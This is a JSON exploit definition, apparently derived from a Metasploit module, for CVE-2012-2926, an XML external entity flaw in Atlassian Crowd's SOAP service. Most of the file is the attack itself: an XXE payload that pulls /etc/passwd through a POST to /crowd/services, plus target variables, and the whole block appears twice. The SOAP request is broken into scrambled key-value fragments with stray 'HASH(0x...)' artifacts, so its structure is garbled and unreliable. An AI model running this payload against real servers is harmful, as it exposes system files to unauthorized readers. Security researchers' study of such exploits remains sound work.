{
   "description" : "\n\n          This module simply attempts to read a remote file from the server using a\n\n        vulnerability in the way Atlassian Crowd handles XML files. The vulnerability\n\n        occurs while trying to expand external entities with the SYSTEM identifier. This\n\n        module has been tested successfully on Linux and Windows installations of Crowd.\n\n      ",
   "method" : "",
   "platform" : "SCANNER",
   "title" : "Atlassian Crowd XML Entity Expansion Remote File Access",
   "variables" : {
      "PATH" : {
         "VALUE" : "/crowd/services",
         "DESCRIPTION" : "Path to Crowd"
      },
      "RFILE" : {
         "VALUE" : "/etc/passwd",
         "DESCRIPTION" : "Remote File"
      }
   },
   "msf_module" : "atlassian_crowd_fileaccess",
   "references" : [
      "https://www.neg9.org",
      "https://confluence.atlassian.com/display/CROWD/Crowd+Security+Advisory+2012-05-17"
   ],
   "cve" : "CVE-2012-2926",
   "name" : "AtlassianCrowdFileaccess",
   "osvdb" : 82274,
   "paths" : [
      "crowd/services"
   ],
   "requests" : {
      "EXPLOIT1" : {
         "<aut:token>?</aut:token>\r\n" : "</urn:in0>\r\n",
         "<urn:in1>\r\n" : "<!--Zero or more repetitions:-->\r\n",
         "Sending Exploit #1 Request : [POST] /" : "HEADERS",
         "<soap:SOAPPrincipalWithCredential>\r\n" : "<!--Optional:-->\r\n",
         "HASH(0x26f14b8)" : "VALIDATION",
         "<!--Zero or more repetitions:-->\r\n" : "<urn:string>?</urn:string>\r\n",
         "</soap:attributes>\r\n" : "TEXT",
         "PAYLOAD" : "<!DOCTYPE foo [<!ENTITY BZkspOs SYSTEM \"file:///etc/passwd\"> ]>\r\n",
         "<aut:encryptedCredential>?&BZkspOs;</aut:encryptedCredential>\r\n" : "</soap:passwordCredential>\r\n",
         "<!--Optional:-->\r\n" : "<soap:values>\r\n",
         "<urn:in0>\r\n" : "<!--Optional:-->\r\n",
         "HASH(0x275b4c0)" : null,
         "<aut:name>?</aut:name>\r\n" : "<!--Optional:-->\r\n",
         "<soapenv:Body>\r\n" : "<urn:addAllPrincipals>\r\n",
         "METHOD" : "POST",
         "<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:urn=\"urn:SecurityServer\" xmlns:aut=\"http://authentication.integration.crowd.atlassian.com\" xmlns:soap=\"http://soap.integration.crowd.atlassian.com\">\r\n" : "<soapenv:Header/>\r\n",
         "PATH" : "",
         "<aut:credential>?</aut:credential>\r\n" : "<!--Optional:-->\r\n",
         "<soap:passwordCredential>\r\n" : "<!--Optional:-->\r\n",
         "</soap:values>\r\n" : "</soap:SOAPAttribute>\r\n"
      }
   },
   "plugins_directory" : "/home/evil/GIT/Exploits/../data/plugins/",
   "type" : "MSF",
   "detection" : {},
   "informations" : {
      "METHOD" : "",
      "TYPE" : "MSF",
      "PLATFORM" : "SCANNER",
      "REFERENCES" : [
         "https://www.neg9.org",
         "https://confluence.atlassian.com/display/CROWD/Crowd+Security+Advisory+2012-05-17"
      ],
      "PATHS" : [
         "crowd/services"
      ],
      "MSF_MODULE" : "atlassian_crowd_fileaccess",
      "VARIABLES" : {
         "RFILE" : {
            "VALUE" : "/etc/passwd",
            "DESCRIPTION" : "Remote File"
         },
         "PATH" : {
            "VALUE" : "/crowd/services",
            "DESCRIPTION" : "Path to Crowd"
         }
      },
      "name" : "AtlassianCrowdFileaccess",
      "OSVDB" : 82274,
      "REQUESTS" : {
         "EXPLOIT1" : {
            "<aut:token>?</aut:token>\r\n" : "</urn:in0>\r\n",
            "<urn:in1>\r\n" : "<!--Zero or more repetitions:-->\r\n",
            "Sending Exploit #1 Request : [POST] /" : "HEADERS",
            "<soap:SOAPPrincipalWithCredential>\r\n" : "<!--Optional:-->\r\n",
            "HASH(0x26f14b8)" : "VALIDATION",
            "<!--Zero or more repetitions:-->\r\n" : "<urn:string>?</urn:string>\r\n",
            "</soap:attributes>\r\n" : "TEXT",
            "PAYLOAD" : "<!DOCTYPE foo [<!ENTITY BZkspOs SYSTEM \"file:///etc/passwd\"> ]>\r\n",
            "<aut:encryptedCredential>?&BZkspOs;</aut:encryptedCredential>\r\n" : "</soap:passwordCredential>\r\n",
            "<!--Optional:-->\r\n" : "<soap:values>\r\n",
            "<urn:in0>\r\n" : "<!--Optional:-->\r\n",
            "HASH(0x275b4c0)" : null,
            "<aut:name>?</aut:name>\r\n" : "<!--Optional:-->\r\n",
            "<soapenv:Body>\r\n" : "<urn:addAllPrincipals>\r\n",
            "METHOD" : "POST",
            "<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:urn=\"urn:SecurityServer\" xmlns:aut=\"http://authentication.integration.crowd.atlassian.com\" xmlns:soap=\"http://soap.integration.crowd.atlassian.com\">\r\n" : "<soapenv:Header/>\r\n",
            "PATH" : "",
            "<aut:credential>?</aut:credential>\r\n" : "<!--Optional:-->\r\n",
            "<soap:passwordCredential>\r\n" : "<!--Optional:-->\r\n",
            "</soap:values>\r\n" : "</soap:SOAPAttribute>\r\n"
         }
      },
      "DESCRIPTION" : "\n\n          This module simply attempts to read a remote file from the server using a\n\n        vulnerability in the way Atlassian Crowd handles XML files. The vulnerability\n\n        occurs while trying to expand external entities with the SYSTEM identifier. This\n\n        module has been tested successfully on Linux and Windows installations of Crowd.\n\n      ",
      "TITLE" : "Atlassian Crowd XML Entity Expansion Remote File Access",
      "CVE" : "CVE-2012-2926"
   }
}
